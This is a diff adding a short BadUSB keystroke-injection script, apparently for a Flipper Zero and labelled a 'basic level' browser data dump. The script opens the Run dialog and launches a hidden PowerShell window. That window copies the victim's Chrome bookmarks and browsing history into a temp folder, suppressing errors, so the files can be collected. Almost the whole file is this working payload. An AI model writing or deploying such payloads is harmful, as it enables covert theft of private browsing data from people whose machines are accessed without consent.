@@ -1,0 +1,7 @@
+REM CYBERFLIPPER - BASIC Level
+REM Browser Data Dump - Export browser history and bookmarks
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -W Hidden -C "$d=\"$env:TEMP\browser\";md $d -F;Copy-Item \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks\" \"$d\bookmarks.json\" -EA 0;Copy-Item \"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History\" \"$d\history.db\" -EA 0;explorer $d"
+ENTER
